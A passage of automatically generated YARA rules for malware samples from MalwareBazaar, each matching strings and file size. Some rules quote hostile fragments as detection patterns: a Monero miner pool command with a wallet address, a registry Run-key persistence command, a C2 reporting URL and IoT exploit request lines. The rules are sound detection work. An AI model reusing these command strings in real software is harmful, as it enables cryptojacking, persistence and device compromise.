        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4589KB and
        all of them
}

rule Linux_492724a10a77ea635a2a9024c53c5545776ce2b4353be439be9569fcdcf6e4fe
{
    meta:
        description = "Auto ML: 492724a10a77ea635a2a9024c53c5545776ce2b4353be439be9569fcdcf6e4fe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 34KB and
        all of them
}

rule Windows_493807123c2e449d0dcfdbd3443d083aef30a6aaea42381290572bab06090c0b
{
    meta:
        description = "Auto ML: 493807123c2e449d0dcfdbd3443d083aef30a6aaea42381290572bab06090c0b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "defining_and_specifying_file_locations"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "System.Resources"
        $s14 = "AssemblyKeyFileAttribute"
        $s15 = "defining_and_specifying_file_locations.exe"
        $s16 = "<Module>"
        $s17 = "defining_and_specifying_file_locations.My"
        $s18 = "ThreadSafeObjectProvider`1"
        $s19 = "defining_and_specifying_file_locations.My.Resources"
        $s20 = "MySettings"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5186KB and
        all of them
}

rule Windows_496e7b61508c088d9ddd0c0607ff6561ef756ff2b5575b177ef6e2831f417b3d
{
    meta:
        description = "Auto ML: 496e7b61508c088d9ddd0c0607ff6561ef756ff2b5575b177ef6e2831f417b3d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = ".data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 597KB and
        all of them
}

rule Windows_4a02931e6f207775e87257b2a33b02cc655c520c05ca53c49b5c918cdd78157f
{
    meta:
        description = "Auto ML: 4a02931e6f207775e87257b2a33b02cc655c520c05ca53c49b5c918cdd78157f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Error opening archive %s"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 32559KB and
        all of them
}

rule Windows_4a0a4e9caa9ec0c910beb5023912bdc59e0d07d8a5d6162dd265740630d9268b
{
    meta:
        description = "Auto ML: 4a0a4e9caa9ec0c910beb5023912bdc59e0d07d8a5d6162dd265740630d9268b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1193KB and
        all of them
}

rule Windows_007d4a581f70c7d0a86307123df5d769c3d948dd9b7d5c4ec3b274f2b0bf3647
{
    meta:
        description = "Auto ML: 007d4a581f70c7d0a86307123df5d769c3d948dd9b7d5c4ec3b274f2b0bf3647"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "CorExitProcess"
        $s7 = "FlsGetValue"
        $s8 = "FlsSetValue"
        $s9 = "CreateSemaphoreExW"
        $s10 = "SetThreadStackGuarantee"
        $s11 = "CreateThreadpoolTimer"
        $s12 = "SetThreadpoolTimer"
        $s13 = "WaitForThreadpoolTimerCallbacks"
        $s14 = "CloseThreadpoolTimer"
        $s15 = "CreateThreadpoolWait"
        $s16 = "SetThreadpoolWait"
        $s17 = "CloseThreadpoolWait"
        $s18 = "FlushProcessWriteBuffers"
        $s19 = "GetCurrentProcessorNumber"
        $s20 = "GetLogicalProcessorInformation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1283KB and
        all of them
}

rule Windows_05bae03c60d27c783ab3a71ba4c2207c7297629287b86e35cbee081365780561
{
    meta:
        description = "Auto ML: 05bae03c60d27c783ab3a71ba4c2207c7297629287b86e35cbee081365780561"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1180KB and
        all of them
}

rule Windows_4a44359e80cfd868a532fc075db9670c03c99e24f9ed69710dd43e68fedc8c97
{
    meta:
        description = "Auto ML: 4a44359e80cfd868a532fc075db9670c03c99e24f9ed69710dd43e68fedc8c97"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_4ac7d8a9a14447f7e60f14699384b340ef2564e6fad91727a0f3f2706c726b03
{
    meta:
        description = "Auto ML: 4ac7d8a9a14447f7e60f14699384b340ef2564e6fad91727a0f3f2706c726b03"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 347KB and
        all of them
}

rule Windows_4acddc15352051552d4684fff6d07d18305cf7276d208adf7e2f59c5a70c909a
{
    meta:
        description = "Auto ML: 4acddc15352051552d4684fff6d07d18305cf7276d208adf7e2f59c5a70c909a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "Bkkqzolmmgu.exe"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "IsReadOnlyAttribute"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Collections.ObjectModel"
        $s9 = "JsonReaderException"
        $s10 = "JsonWriterException"
        $s11 = "System.Collections"
        $s12 = "System.Collections.Generic"
        $s13 = "System.Core"
        $s14 = "GetMemberBinder"
        $s15 = "System.Dynamic"
        $s16 = "SetMemberBinder"
        $s17 = "System.Linq.Expressions"
        $s18 = "System.Runtime.Serialization"
        $s19 = "System.ComponentModel"
        $s20 = "System.Collections.Specialized"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2435KB and
        all of them
}

rule Windows_4ad7b8d228fe32d82b0373ce886f224f47c2e06a59d394c634160c70083b5f32
{
    meta:
        description = "Auto ML: 4ad7b8d228fe32d82b0373ce886f224f47c2e06a59d394c634160c70083b5f32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "Montgomery Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s7 = "SHA1 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s8 = "SHA256 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s9 = "DlSHA512 block transform for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s10 = "GF(2^m) Multiplication for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s11 = "AES for x86, CRYPTOGAMS by <appro@openssl.org>"
        $s12 = "CorExitProcess"
        $s13 = "GetActiveWindow"
        $s14 = "GetLastActivePopup"
        $s15 = "GetUserObjectInformationW"
        $s16 = "GetProcessWindowStation"
        $s17 = "FlsGetValue"
        $s18 = "FlsSetValue"
        $s19 = "CreateEventExW"
        $s20 = "CreateSemaphoreExW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB and
        all of them
}

rule Windows_4b0d7d7932c2361c099955820fefc4636459c3ea3b155746fc04a7193d96e5b3
{
    meta:
        description = "Auto ML: 4b0d7d7932c2361c099955820fefc4636459c3ea3b155746fc04a7193d96e5b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "kernel32"
        $s5 = "Microsoft.Win32"
        $s6 = "user32"
        $s7 = "ReadUInt32"
        $s8 = "ReadInt32"
        $s9 = "ReadInt64"
        $s10 = "ReadUInt16"
        $s11 = "ReadInt16"
        $s12 = "<Module>"
        $s13 = "GetModuleFileNameA"
        $s14 = "GetVolumeInformationA"
        $s15 = "get_FormatID"
        $s16 = "get_ASCII"
        $s17 = "System.IO"
        $s18 = "MoveFileExW"
        $s19 = "get_cfoWgeY"
        $s20 = "set_cfoWgeY"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 217KB and
        all of them
}

rule Windows_4b44b1c08bf3bb9f1b9b215eb84c04144e79c4c024b34d5b8b0c8c9309126e71
{
    meta:
        description = "Auto ML: 4b44b1c08bf3bb9f1b9b215eb84c04144e79c4c024b34d5b8b0c8c9309126e71"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System.Core"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Reflection"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "Marmarized.exe"
        $s14 = "<Module>"
        $s15 = "SchemaReaderSql"
        $s16 = "UserExt"
        $s17 = "ProcessFileHandle"
        $s18 = "SYSTEM_HANDLE_INFORMATION"
        $s19 = "FileMapProtection"
        $s20 = "FileMapAccess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 343KB and
        all of them
}

rule Windows_4b7763f16960cf7f830ba960eb39b6b7380570ae3e31dac228a5c378f6448ac1
{
    meta:
        description = "Auto ML: 4b7763f16960cf7f830ba960eb39b6b7380570ae3e31dac228a5c378f6448ac1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_4b77afc2c93fc493b97111ad3e0cb3d1622483091855d5207f37ab9a8acb2d25
{
    meta:
        description = "Auto ML: 4b77afc2c93fc493b97111ad3e0cb3d1622483091855d5207f37ab9a8acb2d25"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2259KB and
        all of them
}

rule Windows_4b8ab8db41213f3a56759ff95b48e08ce9fb7ad52365a4977394913b217a22a9
{
    meta:
        description = "Auto ML: 4b8ab8db41213f3a56759ff95b48e08ce9fb7ad52365a4977394913b217a22a9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 281KB and
        all of them
}

rule Linux_4b947ab8d5638b240d1bce0d46a9ddf17f8c6e383afd3eee8fb34524796fc046
{
    meta:
        description = "Auto ML: 4b947ab8d5638b240d1bce0d46a9ddf17f8c6e383afd3eee8fb34524796fc046"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 86KB and
        all of them
}

rule Windows_05c917e096b3167792ade5691f4ca3b341e62fda93ec4943f08a76179fe67948
{
    meta:
        description = "Auto ML: 05c917e096b3167792ade5691f4ca3b341e62fda93ec4943f08a76179fe67948"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB and
        all of them
}

rule Windows_4ba8be19b243c1ddcefe359a35c8bd3f8969cae00fffe575a44f60f98f473bad
{
    meta:
        description = "Auto ML: 4ba8be19b243c1ddcefe359a35c8bd3f8969cae00fffe575a44f60f98f473bad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1839KB and
        all of them
}

rule Windows_4beb8cf20cfa3a53c04821665ac67cb0dc8e59be8db819457c07ba09c91d20bb
{
    meta:
        description = "Auto ML: 4beb8cf20cfa3a53c04821665ac67cb0dc8e59be8db819457c07ba09c91d20bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "windows"
        $s6 = "email@email.com"
        $s7 = "libgcj-13.dll"
        $s8 = "%TEMP%"
        $s9 = "http://hrtests.ru/S.php?ver=24&pc=%s&user=%s&sys=%s&cmd=%s&startup=%s/%s"
        $s10 = "http://%s/test.html?%d"
        $s11 = "-o stratum+tcp://mine.moneropool.com:3336 -t 1 -u 42n7TTpcpLe8yPPLxgh27xXSBWJnVu9bW8t7GuZXGWt74vryjew2D5EjSSvHBmxNhx8RezfYjv3J7W63bWS8fEgg6tct3yZ -p x"
        $s12 = "/c start /b %%TEMP%%\\NsCpuCNMiner32.exe -dbg -1 %s"
        $s13 = "%s\\NsCpuCNMiner32.exe"
        $s14 = "/c (echo stratum+tcp://mine.moneropool.com:3333& echo stratum+tcp://monero.crypto-pool.fr:3333& echo stratum+tcp://xmr.prohash.net:7777& echo stratum+tcp://pool.minexmr.com:5555)> %TEMP%\\pools.txt"
        $s15 = "open"
        $s16 = "/c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Run\" /d \"%s\" /t REG_SZ /f"
        $s17 = "deleted virtual method called"
        $s18 = "terminate called after throwing an instance of '"
        $s19 = "reference temporary #"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 306KB and
        all of them
}

rule Linux_4c031ad982f5d0ab2dc479c6b50303b52118a1e9d64d05fb31f2747f6b3f181f
{
    meta:
        description = "Auto ML: 4c031ad982f5d0ab2dc479c6b50303b52118a1e9d64d05fb31f2747f6b3f181f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_4c062e33871e165914ef7883c4c82492b2e2d4623b30e0288d3c1ac9038f1e7f
{
    meta:
        description = "Auto ML: 4c062e33871e165914ef7883c4c82492b2e2d4623b30e0288d3c1ac9038f1e7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB and
        all of them
}

rule Linux_4c132411f397fcbe31a43a4b9bbe703e3329991c03dc444f9d608d7a0fefcd5f
{
    meta:
        description = "Auto ML: 4c132411f397fcbe31a43a4b9bbe703e3329991c03dc444f9d608d7a0fefcd5f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 193KB and
        all of them
}

rule Linux_4c2043697a99ead23aa6a17d11762ba9152be82812422eda8bb08dd1c450f881
{
    meta:
        description = "Auto ML: 4c2043697a99ead23aa6a17d11762ba9152be82812422eda8bb08dd1c450f881"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data.rel.ro"
        $s3 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 76KB and
        all of them
}

rule Windows_4c236256dbc5dba5926eda92e6400462301806828b2f56625cd32d1ad447358b
{
    meta:
        description = "Auto ML: 4c236256dbc5dba5926eda92e6400462301806828b2f56625cd32d1ad447358b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 200KB and
        all of them
}

rule Linux_4c3482814c892877794407cde41e67efac2a37771b0b93f64a0e46cdb93718de
{
    meta:
        description = "Auto ML: 4c3482814c892877794407cde41e67efac2a37771b0b93f64a0e46cdb93718de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Linux_4c3b3a50bdbe6c9e313700510d826766c28f2eb8d1b20a0fa1c3fe458e107769
{
    meta:
        description = "Auto ML: 4c3b3a50bdbe6c9e313700510d826766c28f2eb8d1b20a0fa1c3fe458e107769"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Killed process: PID=%d RealPath=%s"
        $s2 = "/usr/lib/systemd/systemd"
        $s3 = "/usr/libexec/openssh/sftp-server"
        $s4 = "httpd"
        $s5 = "system"
        $s6 = "/tmp/tempXXXXXX"
        $s7 = "/proc/self/cmdline"
        $s8 = "No such file or directory"
        $s9 = "No such process"
        $s10 = "Interrupted system call"
        $s11 = "Bad file descriptor"
        $s12 = "No child processes"
        $s13 = "Resource temporarily unavailable"
        $s14 = "File exists"
        $s15 = "Too many open files in system"
        $s16 = "Too many open files"
        $s17 = "Text file busy"
